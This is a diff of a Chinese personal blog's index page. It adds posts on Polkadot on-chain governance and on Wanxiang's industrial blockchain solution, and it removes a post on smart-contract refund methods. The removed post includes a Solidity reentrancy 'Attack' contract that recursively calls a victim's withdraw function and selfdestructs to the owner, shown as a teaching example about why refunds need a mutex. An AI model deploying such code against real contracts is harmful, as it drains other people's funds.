@@ -194,7 +194,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">265</span>
+          <span class="site-state-item-count">267</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -236,6 +236,262 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zhuang-weiming.github.io/2020/11/16/Polkadot%E9%93%BE%E4%B8%8A%E6%B2%BB%E7%90%86%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Weiming Zhuang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zhuang's Diary">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/11/16/Polkadot%E9%93%BE%E4%B8%8A%E6%B2%BB%E7%90%86%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90/" class="post-title-link" itemprop="url">Polkadot链上治理机制浅析</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2020-11-16 14:16:04 / Modified: 14:28:56" itemprop="dateCreated datePublished" datetime="2020-11-16T14:16:04+08:00">2020-11-16</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Polkadot的治理分为三个阶段，分别为<strong>提案</strong>、<strong>投票</strong>、<strong>计票阶段</strong>。</p>
+<p>线上链接 ==&gt; <a target="_blank" rel="noopener" href="https://polkadot.js.org/apps/?rpc=wss://kusama-rpc.polkadot.io#/democracy">https://polkadot.js.org/apps/?rpc=wss%3A%2F%2Fkusama-rpc.polkadot.io#/democracy</a></p>
+<h3 id="提案阶段"><a href="#提案阶段" class="headerlink" title="提案阶段"></a>提案阶段</h3><p>可以通过以下几种方式启动提案：</p>
+<ol>
+<li>由DOT持有人提交的公开提案。任何DOT持有人都可以通过抵押最少数量的DOT来提交公开提案，支持该提案的人需要抵押相同数量的DOT以认可该提案。公开提案存储在队列中，按照抵押的DOT数量进行排序，抵押的DOT数最多的提案会定期提交投票阶段。进入投票阶段后，抵押的DOT将被返还给持有人；</li>
+<li>理事会提交的理事会提案。理事会提交的提案也存储在队列中，理事会全员同意一个提案或者大多数理事会成员同意一个提案时，该提案便可以提交到投票阶段；</li>
+<li>作为前序公投执行的一部分而提交的提案；</li>
+<li>技术委员会提交的紧急提案。一般是Polkadot网络出现了bug，需要紧急修复而提交的紧急提案。</li>
+</ol>
+<h3 id="投票阶段"><a href="#投票阶段" class="headerlink" title="投票阶段"></a>投票阶段</h3><p>每隔 28天，将会有一个提案进行定期全民投票。</p>
+<p>这个提案来自DOT持有人提交的公共提案队列或者理事会提交的提案队列，在两个队列之间交替进行。</p>
+<p>比如这一次的提案来自DOT持有人提交的公共提案队列，28天以后的下一个投票阶段，提案便是来自理事会提交的提案队列。一般情况下同一时间段内只能进行一个投票，除非有紧急提案，紧急提案可以与定期投票同时举行。</p>
+<p>从投票结束到实施更改之间的时间称为执行延迟期。对于启动投票的前两种方式，该时间固定为 28 天。对于第三种方式，可以根据需要进行设置。紧急提案会有一个较短的执行时间。</p>
+<p>投票者可以投赞成或反对票，或者放弃投票。投票者如果要对公共提案进行投票，需要锁定一定数量的DOT，并且通常至少要锁定至在公投票结束后的执行延迟期内。</p>
+<p>投票的权重由锁定的DOT数量和锁定时间决定，因此，即使你拥有较少的DOT，但是如果锁定时间足够长，也可能拥有相对将高的权重；相反的，如果锁定时间很短，即便锁定了较多DOT，权重也不一定较高。</p>
+<p>采用这种机制是为了确保需要最小限度的经济投入并防止卖票行为，同时确保了长期致力于该制度的投票者有更大的发言权。</p>
+<h3 id="计票阶段"><a href="#计票阶段" class="headerlink" title="计票阶段"></a>计票阶段</h3><p>根据不同的实体提出的议案，以及是否所有理事会成员都投票赞成，Polkadot提供了三种不同的计票方案。</p>
+<p>如下所示：</p>
+<table>
+<thead>
+<tr>
+<th>实体</th>
+<th>计票方案</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>公开提案</td>
+<td>正投票率偏差</td>
+</tr>
+<tr>
+<td>理事会（全票赞成）</td>
+<td>负投票率偏差</td>
+</tr>
+<tr>
+<td>理事会（多数赞成）</td>
+<td>简单多数制</td>
+</tr>
+</tbody></table>
+<p>下面来解释一下这三种方案。首先，定义四个术语：</p>
+<table>
+<thead>
+<tr>
+<th>术语</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>approve</td>
+<td>赞成票数</td>
+</tr>
+<tr>
+<td>against</td>
+<td>反对票数</td>
+</tr>
+<tr>
+<td>turnout</td>
+<td>投票的代币总数</td>
+</tr>
+<tr>
+<td>electorate</td>
+<td>网络中的DOT发行总数</td>
+</tr>
+</tbody></table>
+<p><strong>▲ 正投票率偏差</strong></p>
+<p>该方案使用以下公式来表示，只有当不等式成立的时候，投票才通过。可以看到，在投票的代币总数较少的时候，需要得到绝大多数的赞成票数才能通过投票；当投票的代币总数越来越多，直至接近网络中的DOT发行总数时，赞成总数只需要超过半数就可以投票通过，此时演变成了简单多数制方案（见下文）。</p>
+<p><img src="/2020/11/16/Polkadot%E9%93%BE%E4%B8%8A%E6%B2%BB%E7%90%86%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90/1.png"></p>
+<p><strong>▲ 负投票率偏差</strong></p>
+<p>该方案使用以下公式表示，该方案和上面的正投票率偏差正好相反：当投票的代币总数较少时，仅需要少量的赞成票数即可通过投票；当投票的代币总数达到网络中的DOT发行总数时，需要超过半数才能通过投票，此时也演变成了简单多数制方案。</p>
+<p><img src="/2020/11/16/Polkadot%E9%93%BE%E4%B8%8A%E6%B2%BB%E7%90%86%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90/2.png"></p>
+<p>▲ 该方案用以下公式表示，该方案显而易见，即为简单的少数服从多数思想。</p>
+<p><img src="/2020/11/16/Polkadot%E9%93%BE%E4%B8%8A%E6%B2%BB%E7%90%86%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90/3.png"></p>
+<p><strong>提出重要的提案</strong></p>
+<p>理事会提出的候选提案，需要获得绝大部分理事会成员的赞成票，并且没有成员投反对票。一个成员只能对一个提案投一次反对票，如果有成员对提案投了反对票，则需要进入冷静期，如果在冷静期之后重再次获得了大多数成员的赞成票，则该提案不可以再被否决。获得理事会成员多数票赞成的提案，将以简单多数制的投票方案进行投票。获得理事会成员全票赞成的提案，采用负投票率偏差的机制进行投票。</p>
+<p><strong>取消危险或恶意的提案</strong></p>
+<p>超过理事会三分之二成员的同意，可以取消投票。如果取消投票的争议很大，无法获得三分之二多数同意，那么将由全体利益相关者即DOT持有人来决定该提案。</p>
+<p><strong>理事会成员选举</strong></p>
+<p>Polkadot理事会将有23个席位，每个月进行一次投票选举，所有DOT持有人均可自由注册竞选理事会成员的资格，并可以给自己支持的候选人进行投票，投票权与其所持股份成正比。</p>
+<p>这里的投票方式为<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=Mzg2MDA2NzQwNw==&mid=2247483750&idx=1&sn=719ed60f2ecde4ec65f91e9d3e5fccab&chksm=ce2d4246f95acb50758e59bb497c98123d1520b25e3ffefc1bdb5d4b587f2b2f13c2407b8a95&scene=21#wechat_redirect"><strong>NPOS选举验证人的方式</strong></a>一样。</p>
+<h3 id="Polkadot治理机制优缺点"><a href="#Polkadot治理机制优缺点" class="headerlink" title="Polkadot治理机制优缺点"></a>Polkadot治理机制优缺点</h3><p>传统的区块链一般采用链下治理的方式，拿以太坊举例，由以太坊基金会在github上收集改进提案，然后由生态参与者进行讨论表达观点，之后由开发团队决定是否采纳提案。如果采纳，将对代码进行更新和升级，最后矿工节点决定是否使用新的代码以支持该提案。</p>
+<p>和上面这种链下治理相比，Polkadot的链上治理机制有几个明显的<strong>优点</strong>：</p>
+<ol>
+<li>Polkadot采用链上存储的WebAssembly代码，使得矿工节点无需重启便可以使用新的提案，从技术上避免了硬分叉。而链下治理的区块链，如果最后部分矿工或者节点运营商不支持提案，则不会使用更新后的代码，这样便出现了硬分叉。</li>
+<li>Polkadot采用的链上治理每一个阶段都有明确的时间。而链下治理的时间节点不定，github上可以看到很多以太坊多年前的提案还处于“draft”状态。</li>
+<li>每一个DOT持有人都可以参与Polkadot治理，社区治理权在DOT持有人手中。而采用链下治理，最终决定权在于项目的核心开发者，存在中心化问题。</li>
+</ol>
+<p>Polkadot的治理机制还是存在以下几个<strong>问题</strong>：</p>
+<ol>
+<li>大部分DOT持有人仅仅只是参与投资，不会参与社区治理，实际参与社区治理的用户数量不多，导致投票率不高。</li>
+<li>虽然治理最终决定权不在项目的开发者，但是持有大量DOT的用户可以影响投票结果，也降低了链上治理的去中心化程度。</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zhuang-weiming.github.io/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Weiming Zhuang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zhuang's Diary">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/" class="post-title-link" itemprop="url">万向的产业区块链解决方案</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-10-29 15:20:04" itemprop="dateCreated datePublished" datetime="2020-10-29T15:20:04+08:00">2020-10-29</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2020-11-12 15:52:50" itemprop="dateModified" datetime="2020-11-12T15:52:50+08:00">2020-11-12</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>在28日的“分布式认知工业互联网”分论坛上，万向区块链执行总裁王允臻表示，数字化转型下的新型制造业是由数据驱动，全生命周期管理，平台化公共服务，利用相关方分布式参与。传统制造业的特点是流程驱动管理，流程是主题，数据是附属。工业互联网平台的特点是数据驱动管理，数据是主题，流程是附属。分布式认知工业互联网的特点是自组织自协同，区块链、隐私计算和知识图谱等作为技术支撑，分布式企业相互协同，数据分布式存储。</p>
+<p>参考链接==&gt; <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzI3MzYxNDg1Nw==&mid=2247488517&idx=1&sn=2aa8e5814c48846626386c1595e6af57&chksm=eb21c563dc564c752d75c7cff8582da9e819a98b6d08fb6d1be044bc51f25a81def46ae0937b&scene=126&sessionid=1603956935&key=9255e861c291e6d5c5f1f47ab41266ffa847e82a8015a4140df7b36429f3890f0654558e207ef744f7f92ecaec01617ac3973f3b7e4ddea725abc020c8eeea363f309572b8d1e190bc2b2a6c1d0975f17ddb363e4535151e4ac188393304d8e4557ac160b813856547d9647f8084616091721d91371f978130fd5e196b5c5422&ascene=1&uin=MjY4NjE1NTk4MQ==&devicetype=Windows+10+x64&version=6300002f&lang=zh_CN&exportkey=AWZKG04vpm/WJ4ANoZCPz6A=&pass_ticket=Cmy377dXVM9xjKGymbGKVjLX9vQaqUDCvislIUalp5Ypp5ijL+H18//vMndC5gny&wx_header=0">万向区块链王允臻详解什么是“分布式认知工业互联网</a></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/1.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/2.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/3.JPG"></p>
+<p>分布式认知到底是什么？三大技术底座：区块链、隐私计算、知识图谱。</p>
+<p><strong>首先是隐私计算</strong>，它解决的是数据安全及主权的问题，当前的工业互联网面临的挑战之一就是是“鸡生蛋，还是蛋生鸡”的问题。如果一个工业互联网平台不能给企业、政府带来明确的价值，那企业或者政府为什么要承担这个风险，把自己的数据分享出来呢？可是没有企业的数据，就无法打造超出零和博弈的商业模式。巧妇难为无米之炊。那么，如何突破这种封闭模式呢？以可信的方式让基于业务需要的多源异构的工业数据上传到平台上以密文的形式多方协同计算，将会是一个极好的突破口。</p>
+<p><strong>第二个是区块链</strong>，它主要解决的问题是分布式数据资产的存储与调用、分布式商业模式的构建，以及价值的交换、激励及治理机制的构建，还有相应的企业、行业及产业的管理。</p>
+<p><strong>第三个是知识图谱</strong>，它是对宏观数据、企业小规模定向数据从降本增效的层面来进行优化和引导，同时也会通过产业知识图谱及发展趋势预测来助力政府进行产业格局的布局及优化。发现问题、及时加以解决；发现机会、及时捕捉机会。</p>
+<p>以隐私计算、区块链、知识图谱为支撑的分布式认知工业互联网，必将快速推进从数字化到价值化的阶段跨越。<strong>在隐私计算方面</strong>，我们基于多年积累的生态伙伴，能够解决必要数据上平台的问题，也通过跟各地政府的合作，解决上什么样的平台、如何构建及定义平台、平台能够解决什么样的业务痛点、商业模式又如何打造的问题；<strong>在区块链方面</strong>，我们对治理模式、特别是激励模式方面有多年的积累与实践，比如建立工分制、在产业合作中的企业及行业根据贡献获取相应的收益；<strong>在知识图谱方面</strong>，结合工业大数据与AI的技术，让数据的价值发挥到极致。</p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/4.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/5.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/6.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/7.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/8.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/9.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/10.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/11.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/12.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/13.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/14.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/15.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/16.JPG"></p>
+<p>关于知识图谱的能力展示：</p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/17.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/18.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/19.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/20.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/21.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/22.JPG"></p>
+<p><img src="/2020/10/29/%E4%B8%87%E5%90%91%E7%9A%84%E4%BA%A7%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/23.JPG"></p>
+<p><a target="_blank" rel="noopener" href="https://www.datayes.com/">https://www.datayes.com/</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -495,179 +751,8 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zhuang-weiming.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E9%80%80%E6%AC%BE%E6%96%B9%E5%BC%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Weiming Zhuang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Zhuang's Diary">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E9%80%80%E6%AC%BE%E6%96%B9%E5%BC%8F/" class="post-title-link" itemprop="url">智能合约-退款方式</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2020-09-18 16:29:31" itemprop="dateCreated datePublished" datetime="2020-09-18T16:29:31+08:00">2020-09-18</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2020-11-02 18:16:50" itemprop="dateModified" datetime="2020-11-02T18:16:50+08:00">2020-11-02</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>​    在售卖商品时，有可能因质量或者其他问题发生商品退回，同时必须给买家退款。通常，合约里记录追踪了所有的买家，可以放置在一个名叫 refund 的函数中，遍历所有的买家，从而找到需要退款的买家，最后把退款返回给到买家的地址上。退款中可以使用 <code>buyerAddress.transfer()</code> 或者 <code>buyerAddress.send()</code>。区别在于：<code>transfer()</code>在发生错误的情况下发生异常，而<code>send()</code>在发生意外的情况下不抛出异常，只是返回 false。<code>send()</code>的这个特性很重要，因为大部分买家是外部账户，但也有些买家可能是合约账户。如果合约账户中 Fallback 时出错，并抛出异常，遍历就会结束。交易被完全回退，这时，没有买家拿到退款。换句话说，退款程序被阻塞了。（实际上，单次调用中，transfer()更加安全，可以根据异常判断调用情况，所以尽量使用transfer() ）</p>
-<p>​    使用 <code>send()</code>，错误的合约账户也不会阻塞其他买家的退款。但是<code>send()</code> 在使用时要注意<a target="_blank" rel="noopener" href="https://willzhuang.github.io/2019/06/10/%E5%85%B3%E4%BA%8E%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%96%B0%E8%AE%A4%E7%9F%A5/">重入攻击</a>。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.12</span>;</span><br><span class="line"></span><br><span class="line">contract WithdrawalContract &#123;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) buyers;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value &gt; <span class="number">0</span>);</span><br><span class="line">        buyers[msg.sender] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint256 amount = buyers[msg.sender];</span><br><span class="line">        <span class="built_in">require</span>(amount &gt; <span class="number">0</span>);</span><br><span class="line">        buyers[msg.sender] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender.send(amount));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://willzhuang.github.io/2019/06/10/%E5%85%B3%E4%BA%8E%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%96%B0%E8%AE%A4%E7%9F%A5/">重入攻击</a> 的具体攻击手段：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    address victim;</span><br><span class="line"></span><br><span class="line">    modifier ownerOnly &#123; <span class="built_in">require</span>(owner == msg.sender); _; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Attack</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123; owner = msg.sender; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置已部署的合约实例地址，即攻击的合约对象</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setVictim</span>(<span class="params">address target</span>) <span class="title">ownerOnly</span> </span>&#123; victim = target; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deposit Ether to deployed contract</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">step1</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.balance &gt; amount) &#123;</span><br><span class="line">            victim.call.value(amount)(bytes4(keccak256(<span class="string">&quot;deposit()&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// withdraw Ether from deployed contract</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">step2</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        victim.call(bytes4(keccak256(<span class="string">&quot;withdraw(address,uint256)&quot;</span>)), <span class="built_in">this</span>, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// selfdestruct, send all balance to owner</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stopAttack</span>(<span class="params"></span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">startAttack</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        step1(amount);</span><br><span class="line">        step2(amount / <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (msg.sender == victim) &#123;</span><br><span class="line">            <span class="comment">// step3 (收款后，自动执行)</span></span><br><span class="line">            <span class="comment">// 再次尝试调用 攻击对象 的 withdraw 函数，递归转币</span></span><br><span class="line">            victim.call(bytes4(keccak256(<span class="string">&quot;withdraw(address,uint256)&quot;</span>)), <span class="built_in">this</span>, msg.value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>所以上述代码采用互斥锁较为妥当。：</p>
